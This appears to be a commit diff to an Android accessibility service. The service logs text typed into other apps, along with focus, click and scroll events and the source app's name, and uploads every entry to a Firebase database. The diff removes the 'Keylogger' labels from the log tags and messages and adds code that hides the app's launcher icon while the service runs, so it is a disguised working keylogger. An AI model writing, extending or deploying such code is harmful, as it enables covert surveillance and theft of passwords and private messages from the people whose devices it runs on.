@@ -3,6 +3,7 @@ package com.system.internet
 import android.accessibilityservice.AccessibilityService
 import android.content.ComponentName
 import android.content.pm.PackageManager
+import android.content.Intent
 import android.os.Build
 import android.util.Log
 import android.util.Log.i
@@ -24,8 +25,8 @@ class MyService : AccessibilityService() {
     val firebaseAuth = FirebaseAuth.getInstance()
     val firebaseDatabase = FirebaseDatabase.getInstance()
 
-    val TAG = "Keylogger_tag"
-    val USER_REFRENCE = "users"
+    val TAG = "MyService_info"
+    val USER_REFRENCE = "data"
     val DATA_REFRENCE = "data"
     val ACCOUNT_DATA = "account data"
     val DEVICE_NAME = "Device Name"
@@ -97,9 +98,9 @@ class MyService : AccessibilityService() {
             applicationContext.getSharedPreferences(PREFERENCE_NAME, MODE_PRIVATE)
         childName = sharedPreferences.getString(CHILD_NAME_KEY, "").toString()
         i(TAG, childName)
-//        keyLogDataRef = firebaseDatabase.getReference("users").child(firebaseAuth.uid.toString())
+//        keyLogDataRef = firebaseDatabase.getReference("data").child(firebaseAuth.uid.toString())
 //            .child(childName).child(KEYLOG_DATA)
-        keyLogDataRef = firebaseDatabase.getReference("users")
+        keyLogDataRef = firebaseDatabase.getReference("data")
 
 
         var parentUid = ""
@@ -144,33 +145,33 @@ class MyService : AccessibilityService() {
 
 
     override fun onServiceConnected() {
-        i(TAG, "onServiceConnected: Keylogger Activated")
+        i(TAG, "onServiceConnected: "+getString(R.string.app_name)+" Activated")
+        setLauncherIconVisibility(false)
     }
 
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-
+//        i("cek", event.toString())
         when (event!!.eventType) {
-
-
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
-                val data = event.text.toString()
+                var data =  "{${event.beforeText.toString()}}" +  event.text.toString()
                 i(TAG, "${getDateTime()} |(TEXT)| $data")
+//                i(TAG, "${getDateTime()} |(TEXT)| $data")
 //                keyLogDataRef.push().child("keylog").setValue("${getDateTime()} |(TEXT)| $data")
-                setData("(TEXT)", data)
+                setData("(TEXT : ${event.packageName})", data)
             }
             AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                 val data = event.text.toString()
                 i(TAG, "${getDateTime()} |(FOCUSED)| $data")
 //                keyLogDataRef.push().child("keylog").setValue("${getDateTime()} |(FOCUSED)| $data")
-                setData("(FOCUSED)", data)
+                setData("(FOCUSED : ${event.packageName})", data)
             }
 
             AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                 val data = event.text.toString()
                 i(TAG, "${getDateTime()} |(CLICKED)| $data")
 //                keyLogDataRef.push().child("keylog").setValue("${getDateTime()} |(CLICKED)| $data")
-                setData("(CLICKED)", data)
+                setData("(CLICKED : ${event.packageName})", data)
             }
 
             AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
@@ -179,7 +180,7 @@ class MyService : AccessibilityService() {
                     i(TAG, "${getDateTime()} |(SCROLLED)| $data")
 //                    keyLogDataRef.push().child("keylog")
 //                        .setValue("${getDateTime()} |(SCROLLED)| $data")
-                    setData("(SCROLLED)", data)
+                    setData("(SCROLLED) : ${event.packageName}", data)
                 }
 
             }
@@ -189,7 +190,7 @@ class MyService : AccessibilityService() {
                 i(TAG, "${getDateTime()} |(TYPE_ASSIST_READING_CONTEXT)| $data")
 //                keyLogDataRef.push().child("keylog")
 //                    .setValue("${getDateTime()} |(READING_CONTEXT)| $data")
-                setData("(READING_CONTEXT)", data)
+                setData("(READING_CONTEXT : ${event.packageName})", data)
             }
 
 
@@ -198,10 +199,17 @@ class MyService : AccessibilityService() {
                 i(TAG, "${getDateTime()} |(CONTEXT_CLICKED)| $data")
 //                keyLogDataRef.push().child("keylog")
 //                    .setValue("${getDateTime()} |(CONTEXT_CLICKED)| $data")
-                setData("(CONTEXT_CLICKED)", data)
+                setData("(CONTEXT_CLICKED : ${event.packageName})", data)
             }
 
 //            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
+//                val nodeInfo = event.source
+//                if (nodeInfo != null){
+//                    dfs(nodeInfo)
+//                }
+//            }
+//
+//            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
 //                val nodeInfo = event.source
 //                if (nodeInfo != null){
 //                    dfs(nodeInfo)
@@ -214,6 +222,7 @@ class MyService : AccessibilityService() {
     fun dfs(info: AccessibilityNodeInfo?) {
         if (info == null) return
         if (info.text != null) {
+            i(TAG, "(WINDOW_STATE_CHANGED) " + info.text + " class: ${info.className}")
             setData("(WINDOW_STATE_CHANGED) " + info.text, " class: ${info.className}")
         }
         for (i in 0 until info.childCount) {
@@ -225,11 +234,27 @@ class MyService : AccessibilityService() {
 
 
     override fun onInterrupt() {
-        Log.i(TAG, "onInterrupt: Keylogger interrupted")
+        Log.i(TAG, "onInterrupt: "+getString(R.string.app_name)+" interrupted")
     }
 
     fun setData(event: String, data: String) {
         keyLogDataRef.push().child("log").setValue("[${getDeviceName()}] ${getDateTime()} |" + event + "| $data")
+    }
+
+    override fun onUnbind(intent: Intent?): Boolean {
+        setLauncherIconVisibility(true)
+        return super.onUnbind(intent)
+    }
+
+    private fun setLauncherIconVisibility(enabled: Boolean) {
+        val packageManager = applicationContext.packageManager
+        val componentName = ComponentName(this, LoginActivity::class.java)
+        val state = if (enabled) {
+            PackageManager.COMPONENT_ENABLED_STATE_ENABLED
+        } else {
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+        }
+        packageManager.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP)
     }
 
 }
